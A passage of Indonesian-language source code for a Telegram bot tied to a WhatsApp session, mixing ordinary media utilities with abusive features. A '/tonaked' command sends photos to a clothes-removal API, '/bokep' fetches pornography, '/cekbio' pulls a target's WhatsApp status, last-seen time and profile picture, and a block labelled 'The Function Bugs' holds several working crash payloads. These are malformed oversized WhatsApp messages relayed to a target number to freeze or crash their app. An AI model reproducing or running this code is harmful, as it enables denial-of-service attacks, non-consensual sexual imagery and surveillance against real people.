      `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(args)}`
    );
    if (!res.ok) throw new Error(`Gagal ambil data pencarian (${res.status})`);

    const data = await res.json().catch(() => ({}));
    if (!data.status || !Array.isArray(data.result) || !data.result.length) {
      return editMessage(`⚠️ Tidak ada hasil ditemukan untuk: ${args}`);
    }

    const top = data.result[0];
    const title = top.title || args;
    const link = top.link;

    // ===== ambil detail =====
    await editMessage(`⌛ Mengambil detail video...\n⎙ Judul : ${title}`);

    const dlRes = await fetch(
      `https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(link)}`
    );
    if (!dlRes.ok) throw new Error(`Gagal ambil detail (${dlRes.status})`);

    const dlData = await dlRes.json().catch(() => ({}));
    const high = dlData?.result?.files?.high;

    if (!high) {
      return editMessage(`⚠️ Video tidak memiliki kualitas High (HD)\n⎙ Judul : ${title}`);
    }

    // ===== download video =====
    await editMessage(`⌭ Mengunduh video...\n⎋ Resolusi : High`);

    const videoRes = await fetch(high);
    if (!videoRes.ok) throw new Error(`Gagal unduh file video (${videoRes.status})`);

    const buffer = Buffer.from(await videoRes.arrayBuffer());
    const filePath = path.join(process.cwd(), `temp_${Date.now()}.mp4`);
    fs.writeFileSync(filePath, buffer);

    // ===== kirim video =====
    await editMessage(`✅ Video ditemukan!\n⸙ Mengirim ke chat...`);
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    await ctx.replyWithVideo(
      { source: filePath },
      {
        caption:
`🎬 HASIL VIDEO BOKEP
⎙ Judul : ${title}
⎋ Resolusi : High`,
        reply_to_message_id: msgId,
        supports_streaming: true,
      }
    );

    fs.unlinkSync(filePath);
  } catch (e) {
    console.error("❌ Error /bokep:", e);
    if (loadingMsg) {
      await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    }
    await ctx.reply(
      `❌ Terjadi kesalahan saat mengambil data\n\n\`\`\`${e.message}\`\`\``,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    ).catch(() => {});
  }
});

bot.command("ssip", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const textMsg = ctx.message?.text;

  if (!chatId || !textMsg) return;

  const input = textMsg.split(" ").slice(1).join(" ").trim();

  // ===== validasi input =====
  if (!input) {
    return ctx.reply(
      "🪧 Format salah.\n\nContoh:\n`/ssip Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl =
    `https://brat.siputzx.my.id/iphone-quoted?` +
    `time=${encodeURIComponent(time)}` +
    `&messageText=${encodeURIComponent(text)}` +
    `&carrierName=${encodeURIComponent(carrier)}` +
    `&batteryPercentage=${encodeURIComponent(battery)}` +
    `&signalStrength=4&emojiStyle=apple`;

  try {
    // ===== chat action =====
    await ctx.telegram.sendChatAction(chatId, "upload_photo").catch(() => {});

    // ===== ambil gambar =====
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    // ===== kirim foto =====
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption:
`「 ⚆ 」IPhone Generate
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 αµƭɦσɾ 」", url: "https://t.me/thezarxx" }]
          ]
        },
        reply_to_message_id: msgId
      }
    );
  } catch (e) {
    console.error("❌ Error /ssip:", e.message);
    await ctx.reply(
      "❌ Terjadi kesalahan saat memproses gambar.",
      { reply_to_message_id: msgId }
    ).catch(() => {});
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;

  if (!chatId || !text) return;

  const keyword = text.split(" ").slice(1).join(" ").trim();

  if (!keyword) {
    return ctx.reply(
      "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  let loading;
  try {
    loading = await ctx.reply("⸙ SEARCHING VIDEO TIKTOK......");

    const searchUrl =
      `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(keyword)}&count=5`;

    const res = await axios.get(searchUrl, { timeout: 20000 });
    const data = res.data;

    const videos =
      data?.data?.videos ||
      data?.data?.list ||
      data?.data?.aweme_list ||
      data?.data ||
      [];

    if (!Array.isArray(videos) || videos.length === 0) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
      return ctx.reply("⚠️ Tidak ada hasil ditemukan untuk kata kunci tersebut.");
    }

    const topVideos = videos.slice(0, 5);
    const uniqueKey = Math.random().toString(36).slice(2, 10);
    tiktokCache.set(uniqueKey, topVideos);

    const keyboard = topVideos.map((v, i) => {
      const title = (v.title || "Tanpa Judul").slice(0, 35);
      return [
        {
          text: `${i + 1}. ${title}`,
          callback_data: `tiktok|${uniqueKey}|${i}`,
        },
      ];
    });

    await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    await ctx.reply(
      `⸙ Ditemukan *${topVideos.length}* hasil untuk:\n\`${keyword}\`\nPilih salah satu video di bawah ini:`,
      {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      }
    );
  } catch (e) {
    console.error("❌ TikTok Search Error:", e.message);
    if (loading) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    }
    await ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.").catch(() => {});
  }
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery?.data;
  const chatId = ctx.chat?.id;

  if (!data || !data.startsWith("tiktok|")) return;

  await ctx.answerCbQuery("⏳ MENGUNDUH VIDEO SABAR LOADING.....").catch(() => {});

  const [, cacheKey, indexStr] = data.split("|");
  const index = parseInt(indexStr, 10);

  const cached = tiktokCache.get(cacheKey);
  if (!cached || !cached[index]) {
    return ctx.reply("⚠️ Data video tidak ditemukan (cache kedaluwarsa).").catch(() => {});
  }

  const v = cached[index];
  const author =
    v.author?.unique_id ||
    v.author?.nickname ||
    v.user?.unique_id ||
    "unknown";

  const videoId =
    v.video_id ||
    v.id ||
    v.aweme_id ||
    v.short_id ||
    v.video?.id;

  const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

  try {
    const res = await axios.post(
      "https://www.tikwm.com/api/",
      `url=${encodeURIComponent(tiktokUrl)}`,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        },
        timeout: 30000,
      }
    );

    const result = res.data;
    if (!result || result.code !== 0 || !result.data) {
      throw new Error("Video tidak valid");
    }

    const vid = result.data;
    const videoUrl =
      vid.play || vid.hdplay || vid.wmplay || vid.play_addr;

    const caption =
`☀ Voidline Searching
Video : *${vid.title || "Video TikTok"}*
Author : @${vid.author?.unique_id || "unknown"}
Likes : ${vid.digg_count || 0}
Comment : ${vid.comment_count || 0}
[🌐 Lihat di TikTok](${tiktokUrl})`;

    await ctx.replyWithVideo(videoUrl, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error("❌ Gagal download:", e.message);
    await ctx.reply("⚠️ Gagal mengunduh video TikTok.").catch(() => {});
  }
});

bot.command("toanime", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /toanime"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar ke mode Anime...")
    .catch(() => null);
    
   try {
    // ===== API anime =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/anime?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴠᴏɪᴅʟɪɴᴇ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /toanime error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tonaked", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tonaked"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar...")
    .catch(() => null);

  try {
    // ===== panggil API =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴠᴏɪᴅʟɪɴᴇ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /tonaked error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tofigure", async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const pengirim = ctx.from;
    const text = ctx.message.text || "";
    const args = text.split(" ").slice(1).join(" ").trim();

    let imageUrl = args || null;

    if (!imageUrl && ctx.message.reply_to_message?.photo) {
      const photo = ctx.message.reply_to_message.photo;
      const fileId = photo[photo.length - 1].file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      imageUrl = fileLink.href;
    }

    if (!imageUrl) {
      return ctx.reply("⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tofigure");
    }

    const status = await ctx.reply("⌭ Mengubah gambar ke mode Figure...");

    const res = await fetch(
      `https://api.nekolabs.web.id/style.changer/figure?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json();
    const hasil = data?.result;

    if (!hasil) {
      return ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        null,
        "⎈ Gagal memproses gambar."
      );
    }

    await ctx.telegram.deleteMessage(chatId, status.message_id);

    await ctx.replyWithPhoto(hasil, {
      caption: `\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
\`\`\``,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    await ctx.reply("⎈ Terjadi kesalahan saat memproses gambar.");
  }
});

bot.command("getcode", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!url) {
      return ctx.reply("🪧 ☇ Format: /getcode https://example.com");
    }

    if (!/^https?:\/\/.+/i.test(url)) {
      return ctx.reply("❌ ☇ Url tidak valid!");
    }

    const loading = await ctx.reply("⏳ ☇ Tunggu sebentar...");

    // ===== HEAD CHECK =====
    let contentType = "";
    try {
      const headRes = await fetch(url, { method: "HEAD" });
      contentType = headRes.headers.get("content-type") || "";
    } catch {}

    const extMatch = url.match(/\.(\w+)$/i);
    const ext = extMatch ? extMatch[1].toLowerCase() : "";

    const isHTML =
      contentType.includes("text/html") ||
      ext === "html" ||
      ext === "";

    // ================= HTML WEBSITE =================
    if (isHTML) {
      const res = await fetch(url);
      const html = await res.text();

      const tmpDir = path.join("./tmp", `site-${Date.now()}`);
      fs.mkdirSync(tmpDir, { recursive: true });
      fs.writeFileSync(path.join(tmpDir, "index.html"), html);

      const $ = cheerio.load(html);
      const resources = new Set();

      $("link[href], script[src], img[src]").each((_, el) => {
        const attr = $(el).attr("href") || $(el).attr("src");
        if (!attr || attr.startsWith("data:")) return;

        try {
          resources.add(new URL(attr, url).href);
        } catch {}
      });

      for (const resUrl of resources) {
        try {
          const fileRes = await fetch(resUrl);
          if (!fileRes.ok) continue;

          const buffer = await fileRes.arrayBuffer();
          const name = path.basename(resUrl.split("?")[0]);
          fs.writeFileSync(path.join(tmpDir, name), Buffer.from(buffer));
        } catch {}
      }

      const zip = new AdmZip();
      zip.addLocalFolder(tmpDir);

      const zipPath = path.join("./tmp", `source-${Date.now()}.zip`);
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({
        source: zipPath,
        filename: "source.zip"
      });

      fs.rmSync(tmpDir, { recursive: true, force: true });
      fs.unlinkSync(zipPath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "✅ ☇ Website berhasil dikumpulkan & dikirim sebagai ZIP."
      );

    // ================= SINGLE FILE =================
    } else {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`Status ${res.status}`);

      const buffer = await res.arrayBuffer();
      const extFile = ext || "txt";
      const fileName = `code-${Date.now()}.${extFile}`;

      fs.mkdirSync("./tmp", { recursive: true });
      const filePath = path.join("./tmp", fileName);
      fs.writeFileSync(filePath, Buffer.from(buffer));

      await ctx.replyWithDocument({
        source: filePath,
        filename: fileName
      });

      fs.unlinkSync(filePath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "☇ File tunggal berhasil diunduh dan dikirim."
      );
    }

  } catch (err) {
    console.error("GETCODE ERROR:", err);
    try {
      await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil source code.");
    } catch {}
  }
});

bot.command("brat", async (ctx) => {
  try {
    const textInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
    const chatId = ctx.chat.id;

    if (!textInput) {
      return ctx.reply(
        "```⸙ 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 — 𝙄𝙈𝘼𝙂𝙀\n✘ Format salah!\n\n☬ Cara pakai:\n/brat teks\n\n⎙ Contoh:\n/brat Halo Dunia```",
        { parse_mode: "Markdown" }
      );
    }

    const loadingMsg = await ctx.reply(
      "```⸙ 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Membuat gambar teks...```",
      { parse_mode: "Markdown" }
    );

    const url = `https://brat.siputzx.my.id/image?text=${encodeURIComponent(textInput)}&emojiStyle=apple`;
    const res = await fetch(url);
    const buffer = Buffer.from(await res.arrayBuffer());

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "⸙ 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Gambar teks berhasil dibuat.",
        parse_mode: "Markdown"
      }
    );

    ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

  } catch (e) {
    console.error("BRAT ERROR:", e);
    ctx.reply(
      "```⸙ 𝙑𝙊𝙄𝘿𝙇𝙄𝙉𝙀 — 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat gambar.```",
      { parse_mode: "Markdown" }
    );
  }
});

const playing = new Map();

bot.command("play", async (ctx) => {
  const chatId = ctx.chat.id;
  const reply = ctx.message.reply_to_message;

  const query =
    ctx.message.text.replace(/^\/play\s*/i, "").trim() ||
    txt(reply);

  if (!query) {
    return ctx.reply("🎧 Ketik judul atau reply judul/link");
  }

  const infoMsg = await ctx.reply("🎧 Proses pencarian...");

  try {
    const isLink = /^https?:\/\/(youtube\.com|youtu\.be)/i.test(query);
    const candidates = isLink
      ? [{ url: query, title: query }]
      : await topVideos(query);

    if (!candidates.length) {
      return ctx.reply("❌ Tidak ada hasil ditemukan");
    }

    const ytUrl = normalizeYouTubeUrl(candidates[0].url);
    if (!ytUrl.includes("watch?v=")) {
      return ctx.reply("❌ Video YouTube tidak valid");
    }

    const apiUrl =
      "https://api.nekolabs.web.id/downloader/youtube/v1?" +
      new URLSearchParams({
        url: ytUrl,
        format: "mp3",
        quality: "128",
        type: "audio"
      });

    const res = await axios.get(apiUrl, { timeout: 60000 });
    const data = res.data;

    if (!data?.success || !data?.result?.downloadUrl) {
      return ctx.reply("❌ Gagal mengambil audio");
    }

    const file = await downloadToTemp(data.result.downloadUrl);
    await ctx.replyWithAudio(
      { source: file },
      {
        title: data.result.title,
        performer: "VOIDLINE GHOST MUSIC",
        caption: `🎧 ${data.result.title}`
      }
    );

    cleanup(file);
    await ctx.deleteMessage(infoMsg.message_id).catch(() => {});

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan saat memproses audio");
  }
});

// The Function Bugs
async function Fcv2(target) {
  try {
    const bangka = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            ephemeralMessage: {
              sendPaymentMessage: {
                extendedTextMessage: {
                  text: "VISIBLE",
                  matchedText: "https://t.me/wolkerdev",
                  description: "🩸⃟༑⌁⃰Abimm⿻𝐂𝐑𝐀𝐒𝐇ཀ🦠️",
                  title: "𐎟 𝐖𝐎𝐋𝐊𝐄𝐑 ⿻ 𝐂𝐑𝐀𝐒𝐇 𐎟",
                },
                paymentLinkMetadata: {
                  LinkPrevieMetadata: {
                    button: { displayText: "F" },
                    name: "address_message",
                    paramsJson: "\x10".repeat(100000),
                  },
                },
                contextInfo: {
                  socialMediaPostType: 9999,
                  linkMediaDuration: 999,
                  urlMetadata: { fbExperimentId: 999 },
                  fbExperimentId: 999,
                },
              },
              version: 3,
            },
          },
        },
      },
    };

    await sock.relayMessage(target, bangka, {
      participant: { jid: target },
      messageId: null,
    });

  } catch (err) {
    console.error("Fcv2 Error:", err);
  }
}

async function fcv1(target) {
  try {
    const messageContent = {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "VISIBLEV1",
            matchedText: "https://t.me/wolkerdev",
            description: "🩸⃟༑⌁⃰Abimm⿻𝐂𝐑𝐀𝐒𝐇ཀ🦠️",
            title: "𐎟 𝐖𝐎𝐋𝐊𝐄𝐑 ⿻ 𝐂𝐑𝐀𝐒𝐇 𐎟",
            contextInfo: {
              socialMediaPostType: 9999,
              linkMediaDuration: 999,
              urlMetadata: { fbExperimentId: 999 },
              fbExperimentId: 999,
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(
      target,
      messageContent,
      { userJid: sock.user.id }
    );

    await sock.relayMessage(
      target,
      msg.message,
      { messageId: msg.key.id }
    );

  } catch (err) {
    console.error("fcv1 Error:", err);
  }
}

async function JayaBlank(target) {
    const Y9x = "𖤐⏤‌‌‌‌Jaya-⃟𝗯𝗹𝗮⃞𝗻𝗸";
    
    const jayaY9x = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝑊𝑒𝑙𝑐𝑜𝑚𝑒𝑇𝑜𝐸𝑟𝑎" + Y9x,
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "​᭄ᥬ" 
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Jaya Y9X",
                                id: "blank_crash"
                            })
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, jayaY9x.viewOnceMessage.message, { 
        participant: { jid: target } 
    });
}

async function CrashXios(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(1500),
          address: "ꦽ".repeat(1000),
          contextInfo: {
            extendedTextMessage: {
              text: "SEJAYA - CrashInvible",
              paymentLinkMetadata: {
                provider: {
                  paramsJson: "{".repeat(70000)
                },
                header: { headerType: 1 },
                buttons: { displayText: "Crash - One Hit" }
              }
            },
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg2 = {
    locationMessage: {
      degreesLatitude: 2.9990000000,
      degreesLongitude: -2.9990000000,
      name: "— ˙🧪⃟꙰ ‌ ‌⃰.ꪸꪰ𝐋⃟𝐞‌𝐚‌𝐦𝐨𝐫༑ 𝐙⃟𝐮‌𝐧‌𝐧⛧⃟˙" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
      url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1800) + `.com`
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log("Invisble Function Bugger");
} 

async function LocaInvis(sock, target) {
  console.log(chalk.red("DelayBy Zunn"));
  
  const Invis = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: -0,
          name: "LOCA",
          url: "https://t.me/zunncrash",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () => 
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "DOCUMAND",
              title: "SEMESTA - DELAY",
              body: "DELAY SANGAT",
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  }, {});

  for (const msg of [Invis]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
  }
}

async function Crashhome(target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            body: {
              text: "Abim Official",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({
                flow_cta: "\u0000".repeat(1420000),
              }),
              version: 3,
            },
          },
          nativeFlowResponseMessage: {
            groupInviteMessage: {
              groupJid: "1203630XXXXXXX@g.us",
              inviteCode: "AbCdEfGhIjKlMnOp",
              inviteExpiration: 10000000,
              groupName: "Team Wolker Crash",
              jpegThumbnail: null,
              caption: "minjem satu juta",
            },
          },
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
            mimetype: "image/webp",
            height: 9999,
            width: 9999,
            directPath:
              "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
            fileLength: 12260,
            mediaKeyTimestamp: "1743832131",
            isAnimated: false,
            stickerSentTs: "X",
            isAvatar: false,
            isAiSticker: false,
            degreesLatitude: 9999,
            degreesLongitude: -9999,
            address: "maklu",
            isLottie: false,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
